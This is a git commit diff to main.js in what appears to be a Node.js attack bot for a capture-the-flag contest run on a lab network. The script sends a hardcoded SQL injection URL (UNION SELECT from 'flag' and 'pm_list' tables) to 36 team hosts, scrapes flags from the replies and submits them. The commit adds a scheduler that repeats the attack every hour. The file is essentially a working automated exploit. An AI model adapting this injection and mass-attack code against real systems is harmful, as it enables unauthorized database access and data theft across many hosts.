479d76d1d139b07ae7126c5e74cb82a6665abf6f
Ting-Yen Lai <banacorn@gmail.com>
2015-06-23 19:05:46 +0800

    attack on schedule

--- main.js
+++ main.js
@@ -1,6 +1,7 @@
 var http = require('http');
 var colors = require('colors');
 var exec = require('child_process').exec;
+var schedule = require('node-schedule');
 
 var inject = function (team) {
     return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
@@ -16,14 +17,14 @@ var regex = /\>(\d) (\w*)\<\/div\>/;
 var attack = function (team) {
     console.log('ATTACKING: '.green + inject(team));
     var req = http.request(inject(team), function (res) {
-        console.log('STATUS: '.green + res.statusCode);
+        // console.log('STATUS: '.green + res.statusCode);
         //console.log('HEADERS: '.green + JSON.stringify(res.headers));
         //res.setEncoding('utf8');
         res.on('data', function (chunk) {
             match = chunk.toString().match(regex);
             if (match) {
                 var flag = match[2];
-                console.log('FLAG: '.green, flag);
+                console.log('FLAG: '.yellow, team, flag);
                 submit(flag);
             }
         });
@@ -38,22 +39,10 @@ var attack = function (team) {
 
 
 
-
-// child_process.spawn("touch ha")
-// i = 0;
-// var tick = true;
-// while (true) {
-//     if (Math.floor(Date.now()/30000) % 2 === 0) {
-//         if (tick) {
-//             console.log('ha');
-//             tick = false;
-//         }
-//     } else if (Math.floor(Date.now()/30000) % 2 === 1) {
-//         tick = true;
-//     } if
-// }Use curl to submit flag
-// curl –L http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/flag.php?ID=[TeamID]&flag=[flag]
-// for (var i = 0; i < 36; i++) {
-//     sleep.sleep(60);
-//     attack(i);
-// }
+var rule = new schedule.RecurrenceRule();
+rule.minute = 0;
+var j = schedule.scheduleJob(rule, function(){
+    console.log('START ATTACKING'.red);
+    for (i = 0; i < 36; i++)
+        attack(i);
+});
